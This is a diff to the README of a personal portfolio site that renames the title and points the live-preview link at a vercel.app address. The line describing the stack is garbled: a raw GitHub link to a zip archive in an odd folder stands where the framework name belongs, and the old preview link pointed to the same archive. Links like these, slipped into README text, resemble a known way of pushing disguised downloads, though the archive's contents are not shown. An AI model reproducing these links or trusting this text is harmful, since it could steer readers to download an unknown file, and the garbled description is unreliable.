@@ -1,11 +1,11 @@
-# ⚛️ React Portfolio Website - Satya Sundar Dey
+# ⚛️ Formal Portfolio Website - Satya Sundar Dey
 
 Welcome to my **Formal Portfolio** built using **https://raw.githubusercontent.com/dotsatya/Formal-Portfolio/main/dinomic/Formal-Portfolio.zip** and **CSS Modules**.  
 This portfolio showcases my skills, projects, and contact details in a responsive and elegant layout — perfect for developers, recruiters, and clients.
 
 ## 🔗 Live Preview
 
-🌐 [Click to Visit Portfolio](https://raw.githubusercontent.com/dotsatya/Formal-Portfolio/main/dinomic/Formal-Portfolio.zip)
+🌐 [Click to Visit Portfolio](https://satyasundardey-portfolio.vercel.app/)
 
 ---
 
